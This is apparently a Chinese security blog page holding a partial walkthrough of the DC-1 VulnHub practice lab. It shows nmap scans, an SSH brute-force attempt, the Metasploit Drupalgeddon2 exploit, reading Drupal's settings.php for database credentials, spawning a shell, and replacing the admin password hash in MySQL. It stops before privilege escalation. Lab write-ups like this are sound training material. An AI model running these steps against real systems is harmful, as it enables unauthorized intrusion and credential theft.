<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="DC靶机1-9合集, HTML,CSS,JavaScript,php,python,linux,mysql等">
    <meta name="description" content="专注web，分享生活，分享知识">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>DC靶机1-9合集 | Script kiddie&#39;s life</title>
    <link rel="icon" type="image/jpeg" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/favicon.jpg">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/css/my.css">

    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/jquery/jquery.min.js"></script>
    
<style type="text/css" lang="css">
    #loading-container{
        position: fixed;
        top: 0;
        left: 0;
        min-height: 100vh;
        width: 100vw;
        z-index: 9999;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        background: #FFF;
        text-align: center;
        /* loader页面消失采用渐隐的方式*/
        -webkit-transition: opacity 1s ease;
        -moz-transition: opacity 1s ease;
        -o-transition: opacity 1s ease;
        transition: opacity 1s ease;
    }
    .loading-image{
        width: 120px;
        height: 50px;
        transform: translate(-50%);
    }

    .loading-image div:nth-child(2) {
        -webkit-animation: pacman-balls 1s linear 0s infinite;
        animation: pacman-balls 1s linear 0s infinite
    }

    .loading-image div:nth-child(3) {
        -webkit-animation: pacman-balls 1s linear .33s infinite;
        animation: pacman-balls 1s linear .33s infinite
    }

    .loading-image div:nth-child(4) {
        -webkit-animation: pacman-balls 1s linear .66s infinite;
        animation: pacman-balls 1s linear .66s infinite
    }

    .loading-image div:nth-child(5) {
        -webkit-animation: pacman-balls 1s linear .99s infinite;
        animation: pacman-balls 1s linear .99s infinite
    }

   .loading-image div:first-of-type {
        width: 0;
        height: 0;
        border: 25px solid #49b1f5;
        border-right-color: transparent;
        border-radius: 25px;
        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
        animation: rotate_pacman_half_up .5s 0s infinite;
    }
    .loading-image div:nth-child(2) {
        width: 0;
        height: 0;
        border: 25px solid #49b1f5;
        border-right-color: transparent;
        border-radius: 25px;
        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
        animation: rotate_pacman_half_down .5s 0s infinite;
        margin-top: -50px;
    }
    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}

    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}

    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}

    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}

    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}

    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}


    .loading-image div:nth-child(3),
    .loading-image div:nth-child(4),
    .loading-image div:nth-child(5),
    .loading-image div:nth-child(6){
        background-color: #49b1f5;
        width: 15px;
        height: 15px;
        border-radius: 100%;
        margin: 2px;
        width: 10px;
        height: 10px;
        position: absolute;
        transform: translateY(-6.25px);
        top: 25px;
        left: 100px;
    }
    .loading-text{
        margin-bottom: 20vh;
        text-align: center;
        color: #2c3e50;
        font-size: 2rem;
        box-sizing: border-box;
        padding: 0 10px;
        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }
    @media only screen and (max-width: 500px) {
         .loading-text{
            font-size: 1.5rem;
         }
    }
    .fadeout {
        opacity: 0;
        filter: alpha(opacity=0);
    }
    /* logo出现动画 */
    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
 </style>
 <script>
(function () {
    const loaded = function(){
       setTimeout(function(){
            const loader = document.getElementById("loading-container");
            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
            // document.getElementById("body-wrap").style.display="flex";
            setTimeout(function(){
                loader.style.display="none";
            },1000); 
        },1000);//强制显示loading page 1s  
    };
    loaded();
})()
 </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Script kiddie's life" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><style type="text/css" lang="css">
    #loading-container{
        position: fixed;
        top: 0;
        left: 0;
        min-height: 100vh;
        width: 100vw;
        z-index: 9999;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        background: #FFF;
        text-align: center;
        /* loader页面消失采用渐隐的方式*/
        -webkit-transition: opacity 1s ease;
        -moz-transition: opacity 1s ease;
        -o-transition: opacity 1s ease;
        transition: opacity 1s ease;
    }
    .loading-image{
        width: 120px;
        height: 50px;
        transform: translate(-50%);
    }

    .loading-image div:nth-child(2) {
        -webkit-animation: pacman-balls 1s linear 0s infinite;
        animation: pacman-balls 1s linear 0s infinite
    }

    .loading-image div:nth-child(3) {
        -webkit-animation: pacman-balls 1s linear .33s infinite;
        animation: pacman-balls 1s linear .33s infinite
    }

    .loading-image div:nth-child(4) {
        -webkit-animation: pacman-balls 1s linear .66s infinite;
        animation: pacman-balls 1s linear .66s infinite
    }

    .loading-image div:nth-child(5) {
        -webkit-animation: pacman-balls 1s linear .99s infinite;
        animation: pacman-balls 1s linear .99s infinite
    }

   .loading-image div:first-of-type {
        width: 0;
        height: 0;
        border: 25px solid #49b1f5;
        border-right-color: transparent;
        border-radius: 25px;
        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
        animation: rotate_pacman_half_up .5s 0s infinite;
    }
    .loading-image div:nth-child(2) {
        width: 0;
        height: 0;
        border: 25px solid #49b1f5;
        border-right-color: transparent;
        border-radius: 25px;
        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
        animation: rotate_pacman_half_down .5s 0s infinite;
        margin-top: -50px;
    }
    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}

    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}

    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}

    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}

    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}

    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}


    .loading-image div:nth-child(3),
    .loading-image div:nth-child(4),
    .loading-image div:nth-child(5),
    .loading-image div:nth-child(6){
        background-color: #49b1f5;
        width: 15px;
        height: 15px;
        border-radius: 100%;
        margin: 2px;
        width: 10px;
        height: 10px;
        position: absolute;
        transform: translateY(-6.25px);
        top: 25px;
        left: 100px;
    }
    .loading-text{
        margin-bottom: 20vh;
        text-align: center;
        color: #2c3e50;
        font-size: 2rem;
        box-sizing: border-box;
        padding: 0 10px;
        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }
    @media only screen and (max-width: 500px) {
         .loading-text{
            font-size: 1.5rem;
         }
    }
    .fadeout {
        opacity: 0;
        filter: alpha(opacity=0);
    }
    /* logo出现动画 */
    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
 </style>
 <script>
(function () {
    const loaded = function(){
       setTimeout(function(){
            const loader = document.getElementById("loading-container");
            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
            // document.getElementById("body-wrap").style.display="flex";
            setTimeout(function(){
                loader.style.display="none";
            },1000); 
        },1000);//强制显示loading page 1s  
    };
    loaded();
})()
 </script></head>



 <div id="loading-container">
     <p class="loading-text">玩命加载中 . . . </p> 
     <div class="loading-image">
         <div></div>
         <div></div>
         <div></div>
         <div></div> 
         <div></div>
     </div>
 </div><body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/logo.jpg" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Script kiddie's life</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">

      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>文章分类</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/categories/web%E5%AE%89%E5%85%A8">
          
          <span>web安全</span>
        </a>
      </li>
      
      <li>
        <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F">
          
          <span>内网渗透</span>
        </a>
      </li>
      
      <li>
        <a href="/categories/CTF">
          
          <span>CTF</span>
        </a>
      </li>
      
      <li>
        <a href="/categories/python">
          
          <span>python</span>
        </a>
      </li>
      
      <li>
        <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">
          
          <span>代码审计</span>
        </a>
      </li>
      
      <li>
        <a href="/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8">
          
          <span>无线安全</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">

      
      <i class="fas fa-bicycle" style="zoom: 0.6;"></i>
      
      <span>各种折腾</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/categories/%E5%8D%9A%E5%AE%A2">
          
          <span>博客</span>
        </a>
      </li>
      
      <li>
        <a href="/categories/qq%E6%9C%BA%E5%99%A8%E4%BA%BA">
          
          <span>qq机器人</span>
        </a>
      </li>
      
      <li>
        <a href="/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%B8%B8">
          
          <span>个人日常</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">

      
      <i class="fas fa-sitemap" style="zoom: 0.6;"></i>
      
      <span>归档</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/tags">
          
          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>文章标签</span>
        </a>
      </li>
      
      <li>
        <a href="/archives">
          
          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>时间轴</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于我</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-envelope" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/logo.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">Script kiddie's life</div>
        <div class="logo-desc">
            
            专注web，分享生活，分享知识
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-bookmark"></i>
			
			文章分类
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>   
				
                  <a href="/categories/web%E5%AE%89%E5%85%A8 " style="margin-left:75px";>
				  
		          <span>web安全</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F " style="margin-left:75px";>
				  
		          <span>内网渗透</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="/categories/CTF " style="margin-left:75px";>
				  
		          <span>CTF</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="/categories/python " style="margin-left:75px";>
				  
		          <span>python</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1 " style="margin-left:75px";>
				  
		          <span>代码审计</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8 " style="margin-left:75px";>
				  
		          <span>无线安全</span>
                  </a>
                </li>
               
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-bicycle"></i>
			
			各种折腾
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>   
				
                  <a href="/categories/%E5%8D%9A%E5%AE%A2 " style="margin-left:75px";>
				  
		          <span>博客</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="/categories/qq%E6%9C%BA%E5%99%A8%E4%BA%BA " style="margin-left:75px";>
				  
		          <span>qq机器人</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%B8%B8 " style="margin-left:75px";>
				  
		          <span>个人日常</span>
                  </a>
                </li>
               
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-sitemap"></i>
			
			归档
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>   
				
                  <a href="/tags " style="margin-left:75px";>
				  
				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
			      
		          <span>文章标签</span>
                  </a>
                </li>
              
                <li>   
				
                  <a href="/archives " style="margin-left:75px";>
				  
				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
			      
		          <span>时间轴</span>
                  </a>
                </li>
               
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于我
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-envelope"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
    </ul>
</div>

        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://Lmg66.github.io/images/pasted-299.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">DC靶机1-9合集</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E9%9D%B6%E5%9C%BA/">
                                <span class="chip bg-color">靶场</span>
                            </a>
                        
                            <a href="/tags/DC/">
                                <span class="chip bg-color">DC</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
                                web安全
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2020-11-25
                </div>
                

                

                

                

                 <span id="busuanzi_container_site_pv" style='display:none'></span> <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp; <span id="busuanzi_value_page_pv" ></span> 

            </div>

        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h3 id="文章前提概述"><a href="#文章前提概述" class="headerlink" title="文章前提概述"></a>文章前提概述</h3><p>本文介绍DC-1靶机的渗透测试流程<br>涉及知识点(比较基础):<br>nmap扫描网段端口服务<br>msf的漏洞搜索<br>drupal7的命令执行利用<br>netcat反向shell<br>mysql的基本操作<br>sudi提权</p>
<h3 id="基本环境搭建"><a href="#基本环境搭建" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h3><p>靶机下载地址:<a href="http://www.five86.com/downloads/DC-1.zip" target="_blank" rel="noopener">http://www.five86.com/downloads/DC-1.zip</a><br><a href="https://download.vulnhub.com/dc/DC-1.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-1.zip</a><br>VMware（windows）:<a href="https://www.52pojie.cn/thread-1026907-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1026907-1-1.html</a><br>选择高版本的vmware，不然可能不支持ova导入<br>下载导入开机vmware设置选择nat模式，目的让你的攻击机和靶机在一个网段，可以根据网络环境自行设置只要在一个网段就行。</p>
<h3 id="基础信息收集"><a href="#基础信息收集" class="headerlink" title="基础信息收集"></a>基础信息收集</h3><h4 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h4><pre><code>nmap -A 192.168.124.0/24</code></pre><p>扫描结果<br>开发80，111，22ssh端口</p>
<pre><code>Host is up (0.00039s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37454/udp   status
|   100024  1          39208/udp6  status
|   100024  1          52048/tcp   status
|_  100024  1          57763/tcp6  status
MAC Address: 00:0C:29:A6:59:A3 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.39 ms 192.168.124.145</code></pre><h4 id="先爆破一下ssh吧-无结果"><a href="#先爆破一下ssh吧-无结果" class="headerlink" title="先爆破一下ssh吧(无结果)"></a>先爆破一下ssh吧(无结果)</h4><pre><code>nmap --script=ssh-brute 192.168.124.145</code></pre><p><img src="/images/pasted-107.png" alt="upload successful"></p>
<h4 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h4><p><img src="/images/pasted-108.png" alt="upload successful"><br>尝试了注册，登录的弱密码，修改密码，无效，但发现admin用户存在<br>wappalyzer指纹识别，发现室Drupal系统<br><img src="/images/pasted-109.png" alt="upload successful"></p>
<h3 id="去漏洞库和msf搜索一下"><a href="#去漏洞库和msf搜索一下" class="headerlink" title="去漏洞库和msf搜索一下"></a>去漏洞库和msf搜索一下</h3><pre><code>msfconsole
search Drupal</code></pre><p><img src="/images/pasted-110.png" alt="upload successful"></p>
<p><img src="/images/pasted-111.png" alt="upload successful"><br>发现有漏洞可以用那就开始msf吧<br>使用2018年的漏洞吧，是个远程代码执行(代码审计现在真心看不懂，😔)<br><a href="https://www.exploit-db.com/exploits/44482" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44482</a><br><a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">https://paper.seebug.org/567/</a><br><img src="/images/pasted-112.png" alt="upload successful"></p>
<h4 id="msf发现连接成功"><a href="#msf发现连接成功" class="headerlink" title="msf发现连接成功"></a>msf发现连接成功</h4><pre><code>use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.124.145
run</code></pre><p><img src="/images/pasted-113.png" alt="upload successful"></p>
<h3 id="寻找一下flag"><a href="#寻找一下flag" class="headerlink" title="寻找一下flag"></a>寻找一下flag</h3><pre><code>shell
find / -name flag*</code></pre><p><img src="/images/pasted-114.png" alt="upload successful"></p>
<pre><code>/home/flag4
/home/flag4/flag4.txt
/var/www/flag1.txt</code></pre><p>打开flag1.txt试试</p>
<pre><code>cat /var/www/flag1.txt</code></pre><p><img src="/images/pasted-115.png" alt="upload successful"><br>翻译一下:每一个好的CMS都需要一个配置文件–你也一样。<br>搜索Drupal的配置文件<br>/var/www/sites/default/settings.php，打开</p>
<pre><code>cat /var/www/sites/default/settings.php</code></pre><pre><code>*
 * flag2
 * Brute force and dictionary attacks aren&#39;t the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  &#39;default&#39; =&gt; 
  array (
    &#39;default&#39; =&gt; 
    array (
      &#39;database&#39; =&gt; &#39;drupaldb&#39;,
      &#39;username&#39; =&gt; &#39;dbuser&#39;,
      &#39;password&#39; =&gt; &#39;R0ck3t&#39;,
      &#39;host&#39; =&gt; &#39;localhost&#39;,
      &#39;port&#39; =&gt; &#39;&#39;,
      &#39;driver&#39; =&gt; &#39;mysql&#39;,
      &#39;prefix&#39; =&gt; &#39;&#39;,
    ),
  ),
);</code></pre><h3 id="发现了flag2和数据库的账号密码，尝试连接一下"><a href="#发现了flag2和数据库的账号密码，尝试连接一下" class="headerlink" title="发现了flag2和数据库的账号密码，尝试连接一下"></a>发现了flag2和数据库的账号密码，尝试连接一下</h3><p>先弄一下交互shell吧</p>
<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/images/pasted-117.png" alt="upload successful"><br>连接数据库尝试一下</p>
<pre><code>mysql -u dbuser -p R0ck3t</code></pre><h3 id="查看一下node和user表，发现flag3"><a href="#查看一下node和user表，发现flag3" class="headerlink" title="查看一下node和user表，发现flag3"></a>查看一下node和user表，发现flag3</h3><pre><code>select * from node;
select * from users;</code></pre><p><img src="/images/pasted-118.png" alt="upload successful"><br>为什么要看node表呢？？？(user表就不说了吧)<br>因为drupal node机制<br><a href="https://www.cnblogs.com/amw863/p/4551889.html" target="_blank" rel="noopener">drupal node机制理解</a><br>so，尝试获得登录的密码，hash值破解可能不太现实<br>我们注册一个账号将二者hash互换不就可以了<br>我丢不行，注册没法写密码，<br>那找到加密脚本自己加密一个不就行了<br>加密脚本位置</p>
<p>scripts/password-hash.sh<br><img src="/images/pasted-119.png" alt="upload successful"></p>
<pre><code>php scripts/password-hash.sh admin

password: admin                 hash: $S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.</code></pre><p>尝试更换管理员密码的hash</p>
<pre><code>update users set pass=&#39;$S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.&#39; where name=&#39;admin&#39;;</code></pre><p><img src="/images/pasted-120.png" alt="upload successful"><br>下面登录测试一下,账号admin密码admin<br><img src="/images/pasted-121.png" alt="upload successful"><br>在content中发现<br><img src="/images/pasted-122.png" alt="upload successful"><br>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
<h3 id="也就是说我们需要寻找密码，而且提示shadow，之前的flag4还没看"><a href="#也就是说我们需要寻找密码，而且提示shadow，之前的flag4还没看" class="headerlink" title="也就是说我们需要寻找密码，而且提示shadow，之前的flag4还没看"></a>也就是说我们需要寻找密码，而且提示shadow，之前的flag4还没看</h3><p><img src="/images/pasted-123.png" alt="upload successful"><br>Can you use this same method to find or access the flag in root?<br>Probably. But perhaps it’s not that easy.  Or maybe it is?<br>应该是让获得管理员权限，再去/etc/shadow看看</p>
<p><img src="/images/pasted-124.png" alt="upload successful"><br>尝试给权限，还是不行<br><img src="/images/pasted-125.png" alt="upload successful"><br>那只能尝试提权了</p>
